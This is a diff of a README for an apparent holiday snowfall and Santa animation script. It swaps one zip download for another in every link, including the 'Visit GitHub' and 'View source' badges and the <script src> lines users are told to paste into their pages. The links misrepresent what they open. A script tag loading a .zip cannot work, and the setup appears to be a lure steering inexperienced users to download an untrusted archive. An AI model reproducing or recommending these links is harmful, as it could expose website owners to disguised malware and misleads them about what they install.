@@ -1,6 +1,6 @@
 # 🎄 Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script - Simple Holiday Animation for Websites
 
-[![Download Now](https://img.shields.io/badge/Download-Christmas%20Magic-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/main/interarboration/Magic-Lightweight-Christmas-Snowfall-Script-Santa-J-Animation-2.2.zip)
+[![Download Now](https://img.shields.io/badge/Download-Christmas%20Magic-blue?style=for-the-badge&logo=github)](https://github.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/raw/refs/heads/main/interarboration/Animation-Christmas-Lightweight-Snowfall-Script-Magic-J-Santa-1.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You can add the animation to any website by linking to the script hosted on a CD
 3. Save your file and open your website in a browser to see the snowfall and Santa animation appear.
 
 ```html
-<script src="https://raw.githubusercontent.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/main/interarboration/Magic-Lightweight-Christmas-Snowfall-Script-Santa-J-Animation-2.2.zip" defer></script>
+<script src="https://github.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/raw/refs/heads/main/interarboration/Animation-Christmas-Lightweight-Snowfall-Script-Magic-J-Santa-1.2.zip" defer></script>
 ```
 
 You can add this to any webpage, even if you have never coded before. Just follow the steps above.
@@ -57,7 +57,7 @@ If you want to keep a local copy of the project or browse the full files, follow
 
 1. Visit the page below to access the files:
    
-   [![Visit GitHub](https://img.shields.io/badge/Visit-GitHub-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/main/interarboration/Magic-Lightweight-Christmas-Snowfall-Script-Santa-J-Animation-2.2.zip)
+   [![Visit GitHub](https://img.shields.io/badge/Visit-GitHub-grey?style=for-the-badge&logo=github)](https://github.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/raw/refs/heads/main/interarboration/Animation-Christmas-Lightweight-Snowfall-Script-Magic-J-Santa-1.2.zip)
 
 2. Click the green **Code** button near the top right.
 3. Select **Download ZIP** from the dropdown menu.
@@ -77,7 +77,7 @@ Follow these steps to add the animation safely:
 2. Place this line before the end of the `<body>` tag.
 
 ```html
-<script src="https://raw.githubusercontent.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/main/interarboration/Magic-Lightweight-Christmas-Snowfall-Script-Santa-J-Animation-2.2.zip" defer></script>
+<script src="https://github.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/raw/refs/heads/main/interarboration/Animation-Christmas-Lightweight-Snowfall-Script-Magic-J-Santa-1.2.zip" defer></script>
 ```
 
 3. Save the changes.
@@ -132,7 +132,7 @@ This project is open source. You can view the source code, report issues, or con
 
 Access the full project here:
 
-[![Access Project](https://img.shields.io/badge/Source-View%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/main/interarboration/Magic-Lightweight-Christmas-Snowfall-Script-Santa-J-Animation-2.2.zip)
+[![Access Project](https://img.shields.io/badge/Source-View%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/bbg73323-design/Christmas-Magic-JS-Lightweight-Snowfall-Santa-Animation-Script/raw/refs/heads/main/interarboration/Animation-Christmas-Lightweight-Snowfall-Script-Magic-J-Santa-1.2.zip)
 
 ---
 
